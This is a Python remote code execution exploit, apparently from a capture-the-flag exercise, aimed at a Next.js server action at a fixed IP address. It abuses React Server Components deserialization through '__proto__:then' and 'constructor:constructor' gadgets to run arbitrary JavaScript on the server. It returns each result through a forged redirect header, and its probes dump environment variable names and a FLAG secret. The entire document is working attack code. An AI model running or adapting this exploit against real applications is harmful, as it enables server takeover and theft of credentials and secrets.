import urllib.request, uuid, urllib.parse

BASE = "http://18.215.143.250:3000"
ACTION_SEARCH = "40881a01be516941afc21e3145707ceff4a34545af"

class NoRedirectHandler(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None

opener = urllib.request.build_opener(NoRedirectHandler)

def run_js(js_expr):
    boundary = "----WebKitFormBoundary" + uuid.uuid4().hex
    
    # We want to evaluate js_expr, convert to string, and throw NEXT_REDIRECT
    cmd = f"var out; try {{ out = ({js_expr}); }} catch(e) {{ out = 'ERR:' + e.message; }} throw Object.assign(new Error(), {{digest: 'NEXT_REDIRECT;push;/' + encodeURIComponent(String(out)).replace(/%/g, '_') + ';307;'}});"
    
    prefix = cmd.replace('\\', '\\\\').replace('"', '\\"') + "//"
    
    chunk0 = '{\n' + \
             '  "then": "$1:__proto__:then",\n' + \
             '  "status": "resolved_model",\n' + \
             '  "reason": -1,\n' + \
             '  "_response": {\n' + \
             '    "_prefix": "' + prefix + '",\n' + \
             '    "_formData": {\n' + \
             '      "get": "$1:constructor:constructor"\n' + \
             '    }\n' + \
             '  },\n' + \
             '  "value": "{\\"then\\":\\"$B0\\"}"\n' + \
             '}'
    
    chunk1 = '"$@0"'
    
    parts = [
        f"--{boundary}\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n{chunk0}\r\n",
        f"--{boundary}\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n{chunk1}\r\n",
        f"--{boundary}--\r\n"
    ]
    body = "".join(parts).encode()
    
    req = urllib.request.Request(
        BASE,
        data=body,
        headers={
            'Content-Type': f'multipart/form-data; boundary={boundary}',
            'Next-Action': ACTION_SEARCH
        }
    )
    
    try:
        resp = opener.open(req, timeout=10)
        redir = resp.headers.get('x-action-redirect', '')
        return redir
    except urllib.error.HTTPError as e:
        redir = e.headers.get('x-action-redirect', '')
        return redir

for test in [
    "Object.keys(process.env).join(',')",
    "process.env.FLAG || 'no FLAG env'",
    "typeof require",
    "typeof process.mainModule",
    "process.version",
    "process.cwd()"
]:
    res = run_js(test)
    print(f"{test} -> {res}")
